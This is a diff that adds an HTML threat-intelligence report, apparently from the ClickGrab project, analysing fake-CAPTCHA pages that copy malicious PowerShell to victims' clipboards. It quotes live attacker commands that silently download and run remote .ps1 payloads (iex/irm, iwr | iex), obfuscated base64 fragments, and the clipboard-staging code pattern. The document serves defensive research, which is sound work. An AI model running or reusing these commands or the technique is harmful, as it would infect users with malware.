@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>ClickGrab - Threat Intelligence Analysis</title>
+  <style>
+    body { font-family: Arial; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; }
+    h1 { color: #2c3e50; border-bottom: 2px solid #3498db; }
+    h2 { color: #3d4c5a; margin-top: 30px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+    pre { background: #f6f8fa; padding: 15px; border-radius: 5px; overflow-x: auto; }
+    a { color: #3498db; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    .navbar { background-color: #2c3e50; padding: 10px 20px; margin-bottom: 20px; border-radius: 4px; }
+    .navbar a { color: white; margin-right: 15px; font-weight: bold; }
+    .navbar a:hover { color: #3498db; text-decoration: none; }
+    .logo-container { text-align: center; margin-bottom: 20px; }
+    .logo { max-width: 300px; height: auto; }
+    .footer { margin-top: 30px; text-align: center; border-top: 1px solid #eee; padding-top: 20px; }
+  </style>
+</head>
+<body>
+  <div class="logo-container">
+    <img src="assets/logo.png" alt="ClickGrab Logo" class="logo">
+  </div>
+  
+  <div class="navbar">
+    <a href="index.html">Home</a>
+    <a href="latest_report.html">Latest Report</a>
+    <a href="analysis.html">Analysis</a>
+    <a href="https://github.com/MHaggis/ClickGrab">GitHub</a>
+  </div>
+  
+  <h1>ClickGrab - Threat Intelligence Analysis</h1>
+  
+  <div id="markdown-content">
+    <h1 id="clickgrab-threat-analysis-report---2025-04-18">ClickGrab Threat Analysis Report - 2025-04-18</h1>
+    <h2 id="most-common-external-domains">Most Common External Domains</h2>
+    <ul>
+      <li><strong>www.google.com</strong>: 38 occurrences</li>
+      <li><strong>use.fontawesome.com</strong>: 27 occurrences</li>
+      <li><strong>cdnjs.cloudflare.com</strong>: 23 occurrences</li>
+      <li><strong>staplebrokenmetaliyro.blogspot.com</strong>: 15 occurrences</li>
+      <li><strong>www.blogger.com</strong>: 13 occurrences</li>
+      <li><strong>www.webgo.de</strong>: 10 occurrences</li>
+      <li><strong>t.me</strong>: 7 occurrences</li>
+      <li><strong>www.w3.org</strong>: 6 occurrences</li>
+      <li><strong>browser.certif-update.website</strong>: 4 occurrences</li>
+      <li><strong>www.blogblog.com</strong>: 2 occurrences</li>
+    </ul>
+    <h2 id="common-pattern-analysis">Common Pattern Analysis</h2>
+    <h3 id="recaptcha-imagery-27-occurrences-1-distinct-urls">reCAPTCHA imagery (27 occurrences, 1 distinct URLs)</h3>
+    <ul>
+      <li>https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png (27 times)</li>
+    </ul>
+    <h3 id="font-resources-50-occurrences-2-distinct-urls">Font resources (50 occurrences, 2 distinct URLs)</h3>
+    <ul>
+      <li>https://use.fontawesome.com/releases/v5.0.0/css/all.css (27 times)</li>
+      <li>https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css (23 times)</li>
+    </ul>
+    <h3 id="cdn-hosted-scripts-24-occurrences-2-distinct-urls">CDN hosted scripts (24 occurrences, 2 distinct URLs)</h3>
+    <ul>
+      <li>https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css (23 times)</li>
+      <li>https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1 (1 times)</li>
+    </ul>
+    <h3 id="google-resources-40-occurrences-8-distinct-urls">Google resources (40 occurrences, 8 distinct URLs)</h3>
+    <ul>
+      <li>https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png (27 times)</li>
+      <li>https://www.google.com/intl/en/policies/privacy/ (4 times)</li>
+      <li>https://www.google.com/intl/en/policies/terms/ (4 times)</li>
+      <li>http://www.google.com/2005/gml/b (1 times)</li>
+      <li>http://www.google.com/2005/gml/data (1 times)</li>
+      <li>...and 3 more distinct URLs</li>
+    </ul>
+    <h2 id="javascript-clipboard-analysis">JavaScript Clipboard Analysis</h2>
+    <p>Found clipboard manipulation code snippets in 54 places</p>
+    <h3 id="documentexeccommand-copy">document.execCommand copy</h3>
+    <p>Found in 54 snippets (100.0% of clipboard code)</p>
+    <p><strong>Examples:</strong></p>
+    <pre><code class="language-javascript">document.execCommand("copy")
+</code></pre>
+    <h3 id="textarea-manipulation">textarea manipulation</h3>
+    <p>Found in 54 snippets (100.0% of clipboard code)</p>
+    <h2 id="command-context-analysis">Command Context Analysis</h2>
+    <p>Found 35 PowerShell download context snippets</p>
+    <h3 id="stageclipboard-function">stageClipboard Function</h3>
+    <p>Found 23 references to stageClipboard function</p>
+    <p><strong>Example stageClipboard contexts:</strong></p>
+    <p><strong>Example 1</strong>:</p>
+    <pre><code class="language-javascript">...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex"`; stageClipboard(commandToRun, verification_id); }...
+</code></pre>
+    <p><strong>Example 2</strong>:</p>
+    <pre><code class="language-javascript">...eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex"`; stageClipboard(commandToRun, verification_id); }...
+</code></pre>
+    <p><strong>Example 3</strong>:</p>
+    <pre><code class="language-javascript">...dC9wWkpIcXRlci50eHQnIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQ=')) | iex"`; stageClipboard(commandToRun, verification_id); }...
+</code></pre>
+    <h3 id="malicious-commands">Malicious Commands</h3>
+    <p>Found 6 commandToRun declarations</p>
+    <p>Malicious commands being prepared for clipboard:</p>
+    <p><strong>Example 1</strong>:</p>
+    <p>Command:</p>
+    <pre><code class="language-powershell">powershell 
+</code></pre>
+    <p>Context:</p>
+    <pre><code class="language-javascript">WindowStyle Hidden -Command \"iex (irm 'https://aatox.com/verify/45.ps1')\""; const commandToRun = "powershell " + htaP...
+</code></pre>
+    <p><strong>Example 2</strong>:</p>
+    <p>Command:</p>
+    <pre><code class="language-powershell">powershell 
+</code></pre>
+    <p>Context:</p>
+    <pre><code class="language-javascript">WindowStyle Hidden -Command \"iex (irm 'https://aatox.com/verify/45.ps1')\""; const commandToRun = "powershell " + htaP...
+</code></pre>
+    <p><strong>Example 3</strong>:</p>
+    <p>Command:</p>
+    <pre><code class="language-powershell">powershell 
+</code></pre>
+    <p>Context:</p>
+    <pre><code class="language-javascript"> = "-w hidden -c \"iwr 'https://yogasitesdev.wpengine.com/2/15.ps1' | iex\""; const commandToRun = "powershell " + htaPat...
+</code></pre>
+    <h3 id="powershell-parameters">PowerShell Parameters</h3>
+    <p>Found 7 htaPath declarations</p>
+    <p>Malicious PowerShell parameters:</p>
+    <p><strong>Example 1</strong>:</p>
+    <p>Parameters:</p>
+    <pre><code class="language-powershell">-NoP -WindowStyle Hidden -Command \
+</code></pre>
+    <p>Context:</p>
+    <pre><code class="language-javascript">...).textContent = verification_id; const htaPath = "-NoP -WindowStyle Hidden -Command \"iex (irm 'https://aatox.com/verify/45.ps1')\"";...
+</code></pre>
+    <h2 id="clipboard-attack-pattern-analysis">Clipboard Attack Pattern Analysis</h2>
+    <p>Based on the data analyzed, here's the complete clipboard attack pattern:</p>
+    <h3 id="1-initial-victim-engagement">1. Initial Victim Engagement</h3>
+    <p>Victim is shown a fake CAPTCHA verification UI with Google reCAPTCHA branding</p>
+    <p>Common elements found:</p>
+    <ul>
+      <li>Google reCAPTCHA logo image</li>
+      <li>Font resources from CDNs</li>
+      <li>"I am not a robot" checkbox</li>
+    </ul>
+    <h3 id="2-malicious-code-preparation">2. Malicious Code Preparation</h3>
+    <p>When user clicks the verification checkbox:</p>
+    <ul>
+      <li>A 'commandToRun' variable is set with a malicious PowerShell command</li>
+      <li>The command is typically obfuscated and often downloads second-stage payloads</li>
+      <li>Common download destinations include:</li>
+    </ul>
+    <p><strong>Example Command Preparation Code:</strong></p>
+    <pre><code class="language-javascript">WindowStyle Hidden -Command \"iex (irm 'https://aatox.com/verify/45.ps1')\""; const commandToRun = "powershell " + htaP...
+</code></pre>
+    <h3 id="3-clipboard-hijacking">3. Clipboard Hijacking</h3>
+    <p>The malicious command is copied to the user's clipboard:</p>
+    <ul>
+      <li>A temporary textarea element is created</li>
+      <li>The command is combined with verification text like "[CHECKMARK] I am not a robot"</li>
+      <li>document.execCommand("copy") is used to copy to clipboard</li>
+      <li>The temporary element is removed from the DOM</li>
+    </ul>
+    <h3 id="4-social-engineering-component">4. Social Engineering Component</h3>
+    <p>User sees a success message:</p>
+    <ul>
+      <li>The verification UI shows success with a checkmark symbol</li>
+      <li>User is told they've passed verification</li>
+      <li>The clipboard now contains the malicious command + verification text</li>
+    </ul>
+    <h3 id="5-attack-objective">5. Attack Objective</h3>
+    <p>Final stage of the attack:</p>
+    <ul>
+      <li>When user pastes the clipboard contents elsewhere (like in terminal)</li>
+      <li>They see what looks like verification text</li>
+      <li>But the PowerShell command at the start gets executed</li>
+      <li>This downloads and runs additional malware from attacker-controlled servers</li>
+    </ul>
+    <h3 id="reconstructed-attack-example">Reconstructed Attack Example</h3>
+    <p>What's copied to clipboard:</p>
+    <pre><code>powershell  # [CHECKMARK] 'I am not a robot - reCAPTCHA Verification Hash: XY12Z345'
+</code></pre>
+    <p>What user sees when pasting: A verification success message</p>
+    <p>What actually happens: PowerShell executes the hidden malicious command</p>
+    <h2 id="conclusion">Conclusion</h2>
+    <p>This is a sophisticated social engineering attack that tricks users into:</p>
+    <ol>
+      <li>Thinking they're completing a legitimate CAPTCHA</li>
+      <li>Unknowingly copying malicious code to their clipboard</li>
+      <li>Executing malware when they paste what they think is just verification text</li>
+    </ol>
+    <h2 id="statistics">Statistics</h2>
+    <ul>
+      <li><strong>Total sites analyzed</strong>: 40</li>
+      <li><strong>Sites with malicious content</strong>: 27</li>
+      <li><strong>Total unique domains</strong>: 19</li>
+      <li><strong>Total URLs extracted</strong>: 155</li>
+    </ul>
+  </div>
+  
+  <div class="footer">
+    <p>Analysis updated: 2025-04-18</p>
+    <a href="https://github.com/MHaggis/ClickGrab">View Project on GitHub</a>
+  </div>
+</body>
+</html>
